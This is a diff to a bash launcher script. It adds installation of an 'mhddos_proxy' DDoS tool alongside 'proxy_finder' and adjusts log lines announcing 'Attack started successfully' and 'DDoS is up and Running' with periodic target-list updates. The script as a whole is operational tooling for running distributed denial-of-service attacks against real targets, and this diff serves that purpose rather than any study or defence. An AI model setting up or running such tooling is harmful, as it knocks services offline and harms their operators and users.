@@ -12,16 +12,19 @@ sleep 3s
 cd ~
 sudo rm -rf proxy_finder
 sudo apt install --upgrade git -y
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/proxy_finder
-cd ~/proxy_finder
-echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements for proxy_finder...\033[0;0m\n\n"
 
-# Install git, python3, etc
+echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
 sudo apt update -y
 sudo apt install --upgrade python3 python3-pip -y
-sleep 3s
+
 python3 -m pip install uvloop
 python3 -m pip install --upgrade pip
+
+cd ~/mhddos_proxy
+python3 -m pip install -r requirements.txt
+cd ~/proxy_finder
 python3 -m pip install -r requirements.txt
 cd ~
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mFiles installed successfully\033[1;0m\n\n"
@@ -232,6 +235,7 @@ do
 
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    		done
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be going only mhddos_proxy (without proxy_finder)\033[0;0m\n"
    		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
 	else
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
